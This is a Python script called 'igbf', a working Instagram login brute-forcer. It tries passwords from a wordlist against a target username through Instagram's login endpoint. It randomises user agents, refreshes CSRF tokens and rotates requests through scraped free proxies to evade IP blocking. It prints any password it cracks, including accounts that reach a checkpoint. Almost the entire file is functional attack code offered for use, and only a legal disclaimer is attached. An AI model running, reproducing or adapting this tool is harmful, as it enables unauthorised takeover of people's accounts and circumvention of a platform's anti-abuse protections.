#!/usr/bin/python3

#######################################################################
#                                                                     #
#  [igbf]    : Instagram Brute Forcer                                 #
#  [desc]    : python3 script to perform instagram login brute force  #
#  [version] : 1.5                                                    #
#  [dev]     : @s41r4j                                                #
#  [github]  : https://github.com/s41r4j/igbf                         #
#                                                                     #
#######################################################################

#######################################################################
#                                                                     #
#   [!] Legal/Ethical disclaimer:                                     #
#                                                                     #
#   > Usage of igbf.py for attacking targets without prior mutual     #
#     consent is illegal.                                             #
#   > It's the end user's responsibility to obey all applicable       #
#     local, state and federal laws.                                  #
#   > Developers assume no liability and are not responsible          #
#     for any misuse or damage caused by this program.                #
#                                                                     #
#######################################################################

import requests
import sys
import argparse
import datetime
import json
import random
import time
import socket
import os


def get_user_agent():
    user_agent_list = """Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36
Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.5 Safari/533.2
Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.3 Safari/533.2
Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.3 Safari/533.2
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.2 Safari/533.2
Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.1 Safari/533.2
Mozilla/5.0 (X11; U; Linux i586; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.1 Safari/533.2
Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.1 Safari/533.2
Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Chrome/5.0.335.0 Safari/533.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/533.16 (KHTML, like Gecko) Chrome/5.0.335.0 Safari/533.16
Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9
Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian
Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.3 (KHTML, like Gecko) Chrome/4.0.227.0 Safari/532.3
Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.3 (KHTML, like Gecko) Chrome/4.0.224.2 Safari/532.3
Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.3 (KHTML, like Gecko) Chrome/4.0.223.5 Safari/532.3
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.8 Safari/532.2
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.8 Safari/532.2
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.8 Safari/532.2
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-US) AppleWebKit/530.6 (KHTML, like Gecko) Chrome/ Safari/530.6
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/ Safari/530.5"""

    # get random line from user agent list
    return random.choice(user_agent_list.splitlines())


def get_csrf_token():
    session = requests.Session()

    header = {
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Content-Length": "0",
        "Host": "www.instagram.com",
        "Origin": "https://www.instagram.com",
        "Referer": "https://www.instagram.com/",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/56.0",
        "X-Instagram-AJAX": "1",
        "X-Requested-With": "XMLHttpRequest",
    }

    cookies = {
        "sessionid": "",
        "mid": "",
        "ig_pr": "1",
        "ig_vw": "1920",
        "csrftoken": "",
        "s_network": "",
        "ds_user_id": "",
    }

    session.headers.update(header)
    session.cookies.update(cookies)

    while True:
        try:
            content = session.get("https://www.instagram.com/", timeout=10)
            if "csrftoken" in content.cookies:
                return content.cookies["csrftoken"]
            else:
                print("CSRF token not found in cookies. Retrying in 5 seconds...")
                time.sleep(5)
        except requests.exceptions.RequestException as e:
            print(f"Error obtaining CSRF token: {e}")
            print("Retrying in 5 seconds...")
            time.sleep(5)


def check_connection():
    while True:
        try:
            r = requests.get("https://www.instagram.com", timeout=10)
            if r.status_code == 200:
                return True
            else:
                return False
        except requests.exceptions.RequestException as e:
            print(f"Connection error: {e}")
            print("Retrying in 5 seconds...")
            time.sleep(5)


def get_public_ip():
    try:
        r = requests.get("https://api.ipify.org", timeout=10).text
    except:
        try:
            r = requests.get("https://ip.seeip.org", timeout=10).text
        except:
            try:
                r = requests.get("https://api.myip.com", timeout=10).json()["ip"]
            except:
                try:
                    r = requests.get("https://ipinfo.io/ip", timeout=10).text
                except:
                    r = "Failed to fetch public ip"

    if r == "":
        r = "Failed to fetch public ip"

    return r


def printit(
    text,
    center="",
    line_up=False,
    line_down=False,
    space_up=False,
    space_down=False,
    coledt=[0, 0, 0],
    normaltxt_start="",
    normaltxt_end="",
    hide=False,
    verbose_mode=False,
):
    if not hide or verbose_mode:
        # get terminal width
        width = os.get_terminal_size().columns

        # printing text
        if space_up:
            print()
        if line_up:
            print("⸺" * width)

        print(normaltxt_start, end="")

        if len(text) < width:
            new_width = int((width - len(text)) / 2)
            print(center * new_width, end="")
            print(
                f"\33[{coledt[0]};{coledt[1]};{coledt[2]}m" + text + "\033[0m", end=""
            )
            print(center * new_width)

        # print(normaltxt_end, end='')

        if line_down:
            print("⸺" * width)
        if space_down:
            print()


def printit2(text, coledt=[0, 0, 0], normaltxt_start=""):
    print(normaltxt_start, end="")
    print(f"\33[{coledt[0]};{coledt[1]};{coledt[2]}m", end="")
    print(text, end="")
    print("\033[0m", end="")


def install(package):
    import subprocess
    import sys

    subprocess.check_call([sys.executable, "-m", "pip", "install", package])


def get_working_proxies(verbose, proxies):
    # Importing modules required for proxy
    from concurrent.futures import ThreadPoolExecutor
    import re

    # Fetching working proxy list
    def fetch(session, proxy):
        url = random.choice(check_proxies)
        if verbose:
            printit(f"[+] Proxy: {proxy} | Checking url: {url}", coledt=[1, 49, 93])
        with session.get(
            url, proxies={"http": proxy, "https": proxy}, timeout=10
        ) as response:
            if response.status_code == 200:
                if verbose:
                    if url == "https://httpbin.org/ip":
                        printit(
                            f"[=] Proxy: {proxy} -> Response: {response.json()['origin']}",
                            coledt=[1, 49, 33],
                        )
                    else:
                        printit(
                            f"[=] Proxy: {proxy} -> Response: {response.text.strip()}",
                            coledt=[1, 49, 33],
                        )

                # match proxy ip (seprated by :) from response.text and ip returned by proxy/requests
                proxy_re = re.search(
                    r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", proxy
                ).group()
                response_re = re.search(
                    r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", response.text
                ).group()

                if proxy_re == response_re:
                    working_proxies.append(proxy)

    # Sorting working proxies
    working_proxies = []
    check_proxies = [
        "http://ident.me/",
        "https://httpbin.org/ip",
        "https://api.ipify.org/",
        "https://icanhazip.com/",
        "https://ip.oxylabs.io/ip",
    ]

    # Checking if the proxy is working
    with requests.Session() as session:
        with ThreadPoolExecutor(max_workers=50) as executor:
            executor.map(fetch, [session] * len(proxies), proxies * len(proxies))

    # Printing total working proxies
    printit(
        str(len(working_proxies)),
        coledt=[1, 49, 96],
        normaltxt_start="\n[+] Total working proxies found: ",
        space_down=True,
        line_down=True,
    )

    return working_proxies


def builtin_proxy(verbose, proxy_limit):
    try:
        import bs4
    except:
        printit(
            "[!] Installing required modules for proxy\n",
            coledt=[1, 49, 92],
            line_up=True,
            space_down=True,
        )
        install("beautifulsoup4")
        printit(
            "[+] Modules installed successfully\n",
            coledt=[1, 49, 92],
            space_up=True,
            line_down=True,
        )
        import bs4

    # Sending a request to get proxy list
    url = "https://free-proxy-list.net/"  # 'https://www.freeproxylists.net/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Cafari/537.36"
    }

    try:
        source = str(requests.get(url, headers=headers, timeout=10).text)
    except:
        printit("[!] Failed to fetch proxy list", coledt=[1, 49, 91])
        while True:
            print("[?] Continue without proxy? (y/n): ", end="")
            choice = input().lower()
            if choice == "y":
                return False
            elif choice == "n":
                raise KeyboardInterrupt()
            else:
                printit("\n[!] Enter y/Y for YES or n/N for NO", coledt=[1, 49, 91])

    # Extracting the proxies from the page
    soup = bs4.BeautifulSoup(source, "lxml")
    proxies = soup.find_all("textarea")[0].text.split("\n")
    proxies = [proxy for proxy in proxies if proxy.strip()]

    # Removing the first two elements (non-proxy elements)
    proxies.pop(0)
    proxies.pop(0)

    # Limiting the number of proxies
    proxies = proxies[:proxy_limit]

    # Printing proxy info
    printit(f"[#] Generating proxies...", coledt=[1, 49, 91], line_up=True)
    printit(
        str(len(proxies)),
        coledt=[1, 49, 96],
        normaltxt_start="[+] Total proxies available: ",
    )
    printit(
        f"\n[+] Scanning working proxies...\n[!] This may take few mins...",
        coledt=[1, 49, 92],
    )
    if verbose:
        time.sleep(1)
        print()

    # Returning working proxies (from the list)
    return get_working_proxies(verbose, proxies)


def custom_proxy(verbose, file_proxies, proxy_limit):
    # Reading the proxy file -> list
    proxies = file_proxies.read().splitlines()

    # Limiting the number of proxies
    proxies = proxies[:proxy_limit]

    # Printing proxy info
    printit("[#] Reading proxies...", coledt=[1, 49, 91], line_up=True)
    printit(
        str(len(proxies)),
        coledt=[1, 49, 96],
        normaltxt_start="[+] Total proxies available: ",
    )
    printit(
        f"\n[+] Scanning working proxies from proxy file...\n[!] This may take few mins...",
        coledt=[1, 49, 92],
    )
    if verbose:
        time.sleep(1)
        print()

    # Returning working proxies (from the list)
    return get_working_proxies(verbose, proxies)


def print_login_failed(password, verbose, proxy, proxies, login_response_status_code):
    if proxy:
        printit(
            "["
            + str(proxies["http"])
            + "] Login failed (incorrect pwd: "
            + password
            + ")",
            coledt=[1, 49, 93],
            hide=True,
            verbose_mode=verbose,
        )
    else:
        printit(
            "["
            + str(login_response_status_code)
            + "] Login failed (incorrect pwd: "
            + password
            + ")",
            coledt=[1, 49, 93],
            hide=True,
            verbose_mode=verbose,
        )


def main():
    # Taking command line arguments using argparse
    parser = argparse.ArgumentParser(
        description="(s41r4j:igbf)> Instagram Brute Forcer"
    )
    parser.add_argument(
        "-u", "--username", help="instagram username (*required)", metavar="USERNAME"
    )
    parser.add_argument(
        "-w",
        "--wordlist",
        help="password wordlist (*required)",
        metavar="WORDLIST PATH",
    )
    parser.add_argument(
        "-t",
        "--timeout",
        help="timeout between each request in secs (default: 2)",
        default=2,
        type=int,
    )
    parser.add_argument(
        "-v",
        "--verbose",
        help="verbose mode (displays failed logins and more)",
        action="store_true",
        default=False,
    )
    parser.add_argument(
        "-p",
        "--proxy",
        help="built-in ip rotating proxy (additinal library required)",
        action="store_true",
        default=False,
    )
    parser.add_argument(
        "-l",
        "--proxy-limit",
        help="limit the number of proxies to use (default: 300; max: 300; min: 1)",
        default=300,
        type=int,
    )
    parser.add_argument(
        "-f",
        "--proxy-file",
        help="use custom proxy file (`-p` & `-l` disabled)",
        metavar="PROXY FILE PATH",
        default=False,
    )
    # parser.add_argument('-g', '--get', help='update the program to the latest version', action='store_true', default=False)
    args = parser.parse_args()

    # Assigning arguments to variables
    username = args.username
    wordlist = args.wordlist
    timeout = args.timeout
    verbose = args.verbose
    proxy = args.proxy
    proxy_file = args.proxy_file
    proxy_limit = args.proxy_limit

    if proxy_file:
        # Getting custom proxy file
        proxy = True
        try:
            file_proxies = open(proxy_file, "r")
        except FileNotFoundError:
            printit(f"[!] {proxy_file} file not found", coledt=[4, 49, 91])
            raise KeyboardInterrupt()
    else:
        # If the number of proxies is more than 300 or less than 1, set to default value (300)
        if proxy_limit > 300 or proxy_limit < 1:
            proxy_limit = 300

    # Logo
    printit(
        " ██▓  ▄████  ▄▄▄▄     █████▒", center=" ", coledt=[1, 49, 91], line_up=True
    )
    printit("▓██▒ ██▒ ▀█▒▓█████▄ ▓██   ▒", center=" ", coledt=[1, 49, 91])
    printit("▒██▒▒██░▄▄▄░▒██▒ ▄██▒████ ░", center=" ", coledt=[1, 49, 91])
    printit("░██░░▓█  ██▓▒██░█▀  ░▓█▒  ░", center=" ", coledt=[1, 49, 91])
    printit("░██░░▒▓███▀▒░▓█  ▀█▓░▒█░   ", center=" ", coledt=[1, 49, 91])
    printit("░▓   ░▒   ▒ ░▒▓███▀▒ ▒ ░ ░  ", center=" ", coledt=[1, 49, 91])
    printit("▒ ░  ░   ░ ▒░▒   ░  ░     ░  ", center=" ", coledt=[1, 49, 91])
    printit("▒ ░░ ░   ░  ░    ░  ░ ░   ░▒ ", center=" ", coledt=[1, 49, 91])
    printit("░        ░  ░                 ", center=" ", coledt=[1, 49, 91])
    printit("                  ░          ░ ", center=" ", coledt=[1, 49, 91])
    printit(
        "[ Instagram Brute Forcer (igbf) ]",
        center=" ",
        coledt=[7, 49, 97],
        line_down=True,
    )

    # Checking if arguments have been passed
    if username is None or wordlist is None:
        parser.print_help()
        printit("[!] Missing required arguments", coledt=[1, 49, 91], line_up=True)
        printit(
            "[-] `-u/--username` and `-w/--wordlist` are required arguments",
            coledt=[1, 49, 91],
            line_down=True,
        )
        sys.exit()

    # Checking if the wordlist file exists
    if not os.path.exists(wordlist):
        printit(f"\n[!] '{wordlist}' file not found", coledt=[1, 49, 91])
        raise KeyboardInterrupt()

    # Checking if the connection is available
    if not check_connection():
        printit(
            "\n[!] Failed to connect to servers\n[!] Check your internet connection",
            coledt=[1, 49, 91],
        )
        raise KeyboardInterrupt()

    # Displaying information
    printit(get_public_ip(), coledt=[1, 49, 96], normaltxt_start="[+] Public IP  : ")
    printit(
        "dictionary attack", coledt=[1, 49, 96], normaltxt_start="[+] Attack Type: "
    )
    printit(
        "https://github.com/s41r4j/igbf",
        coledt=[1, 49, 91],
        normaltxt_start="[+] Github     : ",
        line_down=True,
    )
    printit(str(username), coledt=[1, 49, 96], normaltxt_start="[+] Username   : ")
    printit(str(wordlist), coledt=[1, 49, 96], normaltxt_start="[+] Wordlist   : ")
    printit(str(timeout), coledt=[1, 49, 96], normaltxt_start="[+] Timeout    : ")
    printit(
        (str(proxy) if proxy else "False"),
        coledt=[1, 49, 96],
        normaltxt_start="[+] Proxy      : ",
    )
    if proxy_file:
        printit(
            str(proxy_file), coledt=[1, 49, 96], normaltxt_start="[+] Proxy file : "
        )
    if proxy:
        printit(
            (str(proxy_limit)), coledt=[1, 49, 96], normaltxt_start="[+] Limit proxy: "
        )
    printit(
        str(verbose),
        coledt=[1, 49, 96],
        normaltxt_start="[+] Verbose    : ",
        line_down=True,
    )

    # Opening the wordlist file
    try:
        wordlist = open(wordlist, "r")
    except FileNotFoundError:
        printit("[!] Wordlist not found", coledt=[4, 49, 91])
        sys.exit()

    # Generating proxy list
    if proxy_file:
        proxies = custom_proxy(verbose, file_proxies, proxy_limit)
    elif proxy:
        proxies = builtin_proxy(verbose, proxy_limit)

    # If proxy is enabled and no working proxies found
    if (proxy or proxy_file) and len(proxies) == 0:
        printit("[!] No working proxies found", coledt=[1, 49, 91])
        while True:
            print("[?] Continue without proxy? (y/n): ", end="")
            choice = input().lower()
            if choice == "y":
                proxy = False
                proxy_file = False
                break
            elif choice == "n":
                raise KeyboardInterrupt()
            else:
                printit("\n[!] Enter y/Y for YES or n/N for NO", coledt=[1, 49, 91])

    # Starting brute force
    printit("\n[#] Starting the brute force...\n", coledt=[1, 49, 91])

    # Print start time to calculate total time taken
    start_time = datetime.datetime.now()
    if verbose:
        printit(
            f'[+] Started @ {start_time.strftime("%I:%M:%S %p")}\n', coledt=[1, 49, 93]
        )

    # Print timeout if changed from default value
    if verbose and timeout != 2:
        printit(
            f"[+] Time delay between each attempt: {timeout} secs\n", coledt=[1, 49, 93]
        )

    # Display detailed info about failed attempts
    if not verbose:
        printit(
            "[!] To display failed attempts, use -v or --verbose", coledt=[1, 49, 93]
        )

    # Starting password brute force loop
    for password in wordlist:
        # Request data
        login_url = "https://www.instagram.com/accounts/login/ajax/"
        login_time = int(datetime.datetime.now().timestamp())
        password = password.strip()
        user_agent = get_user_agent()
        csrf_token = get_csrf_token()

        payload = {
            "username": username,
            "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{login_time}:{password}",
            "queryParams": {},
            "optIntoOneTap": "false",
        }

        login_header = {
            "User-Agent": user_agent,
            "X-Requested-With": "XMLHttpRequest",
            "Referer": "https://www.instagram.com/accounts/login/",
            "x-csrftoken": csrf_token,
        }

        while True:
            while True:
                # Check if proxy is enabled (if so, use proxy)
                if proxy:
                    # Get random proxy from proxy list
                    random_proxy = random.choice(list(proxies))
                    single_proxy = {"http": random_proxy, "https": random_proxy}
                else:
                    single_proxy = None

                # Sending request
                try:
                    login_response = requests.post(
                        login_url,
                        data=payload,
                        headers=login_header,
                        proxies=single_proxy,
                    )
                    break
                except requests.exceptions.ConnectionError:
                    continue

            # Proxy check if working
            if proxy:
                headers = {"User-Agent": user_agent}

            # Check if request returned 403 (temporary IP block/username not found)
            if login_response.status_code == 403 or login_response.status_code == "403":
                printit(
                    "\n["
                    + str(login_response.status_code)
                    + "]: Temporary IP BLOCKED, wait for few minutes",
                    coledt=[4, 49, 91],
                )
                if verbose:
                    printit(
                        "["
                        + str(login_response.status_code)
                        + "]: You can also use proxy/VPN (change active vpn server)",
                        coledt=[4, 49, 91],
                    )
                    printit(
                        "["
                        + str(login_response.status_code)
                        + "]: To avoid this use built-in IP rotating proxy (-p/--proxy)",
                        coledt=[4, 49, 91],
                    )
                    printit(
                        "["
                        + str(login_response.status_code)
                        + "]: OR use custom proxy file for IP rotating (-f/--proxy-file)",
                        coledt=[4, 49, 91],
                    )
                    printit(
                        "["
                        + str(login_response.status_code)
                        + "]: Timeout between each request can also help (-t/--timeout)\n",
                        coledt=[4, 49, 91],
                    )
                printit(
                    "["
                    + str(login_response.status_code)
                    + "]: Also check if the USERNAME entered is available",
                    coledt=[4, 49, 91],
                    line_down=True,
                )
                sys.exit()

            # login_response -> json format
            try:
                json_data = json.loads(login_response.text)
            except json.decoder.JSONDecodeError:
                pass

            # Check if json has 'error_type' == 'generic_request_error', retry request with different proxy
            try:
                if json_data["error_type"] == "generic_request_error":
                    continue
            except:
                break

        # Check if username exists
        try:
            if json_data["user"] == False:
                if verbose:
                    printit("\n[#] Login successful: ", coledt=[7, 49, 92])
                    printit(
                        username, coledt=[7, 49, 97], normaltxt_start="[+] Username: "
                    )
                    printit(
                        password, coledt=[7, 49, 97], normaltxt_start="[+] Password: "
                    )
                    printit2(
                        str(user_agent),
                        coledt=[1, 49, 96],
                        normaltxt_start="\n[+] User-agent: ",
                    )
                    printit2(
                        str(csrf_token),
                        coledt=[1, 49, 96],
                        normaltxt_start="\n[+] CSRF token: ",
                    )
                else:
                    printit(
                        password,
                        coledt=[7, 49, 97],
                        normaltxt_start="\n[#] Login successful (pwd)> ",
                        line_down=True,
                    )
                break
        except SystemExit:
            sys.exit()
        except:
            pass

        # Check if password is correct
        try:
            if json_data["message"] == "checkpoint_required":
                if verbose:
                    printit("\n[#] Login successful: ", coledt=[7, 49, 92])
                    printit(
                        username, coledt=[7, 49, 97], normaltxt_start="[+] Username: "
                    )
                    printit(
                        password, coledt=[7, 49, 97], normaltxt_start="[+] Password: "
                    )
                    printit2(
                        str(user_agent),
                        coledt=[1, 49, 96],
                        normaltxt_start="\n[+] User-agent: ",
                    )
                    printit2(
                        str(csrf_token),
                        coledt=[1, 49, 96],
                        normaltxt_start="\n[+] CSRF token: ",
                    )
                    printit2(
                        str("https://www.instagram.com" + json_data["checkpoint_url"]),
                        coledt=[1, 49, 96],
                        normaltxt_start="\n[+] Checkpoint (*req) URL: ",
                    )
                else:
                    printit(
                        password,
                        coledt=[7, 49, 97],
                        normaltxt_start="\n[#] Login successful (pwd)> ",
                        line_down=True,
                    )
                break
        except KeyError:
            try:
                if json_data["authenticated"] == True:
                    if verbose:
                        printit("\n[#] Login successful: ", coledt=[7, 49, 92])
                        printit(
                            username,
                            coledt=[7, 49, 97],
                            normaltxt_start="[+] Username: ",
                        )
                        printit(
                            password,
                            coledt=[7, 49, 97],
                            normaltxt_start="[+] Password: ",
                        )
                        printit2(
                            str(user_agent),
                            coledt=[1, 49, 96],
                            normaltxt_start="\n[+] User-agent: ",
                        )
                        printit2(
                            str(csrf_token),
                            coledt=[1, 49, 96],
                            normaltxt_start="\n[+] CSRF token: ",
                        )
                    else:
                        printit(
                            password,
                            coledt=[7, 49, 97],
                            normaltxt_start="\n[#] Login successful (pwd)> ",
                            line_down=True,
                        )
                    break
                else:
                    print_login_failed(
                        password,
                        verbose,
                        proxy,
                        single_proxy,
                        login_response.status_code,
                    )
            except SystemExit:
                sys.exit()
            except:
                print_login_failed(
                    password, verbose, proxy, single_proxy, login_response.status_code
                )
        except SystemExit:
            sys.exit()
        except:
            print_login_failed(password, verbose, "", "", login_response.status_code)

        # Add random delay to avoid blocking
        time.sleep(timeout)

    # Print end time to calculate total time taken
    end_time = datetime.datetime.now()
    if verbose:
        printit(
            f'\n\n[+] Ended @ {end_time.strftime("%I:%M:%S %p")}', coledt=[1, 49, 93]
        )

    # Calculate total time taken
    printit(
        f"\n[+] Brute force completed in: {end_time - start_time} (H:M:S)",
        coledt=[1, 49, 91],
        line_down=True,
    )


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        printit("\n\n[:)] Exiting the program...", coledt=[1, 49, 92], line_down=True)
        sys.exit()
